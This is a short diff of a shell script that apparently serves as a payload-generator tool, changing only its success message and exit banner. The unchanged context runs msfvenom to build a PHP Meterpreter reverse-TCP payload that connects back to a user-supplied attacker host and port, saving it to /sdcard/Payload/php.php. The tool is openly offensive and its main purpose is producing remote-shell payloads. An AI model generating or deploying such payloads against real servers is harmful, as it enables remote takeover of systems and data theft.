@@ -10,6 +10,8 @@ p() {
 	read b
 	msfvenom -p php/meterpreter/reverse_tcp LHOST=$a LPORT=$b R > /sdcard/Payload/php.php
 	random
-	printf "\n Completed\n\n"
-	}
+					printf "\n\n Successfully saved Payload \033[1;91m(\033[0m/sdcard/Payload\033[1;91m)\n\n"
+					toilet -f font -F metal Exiting
+					fi
+					}
 	p
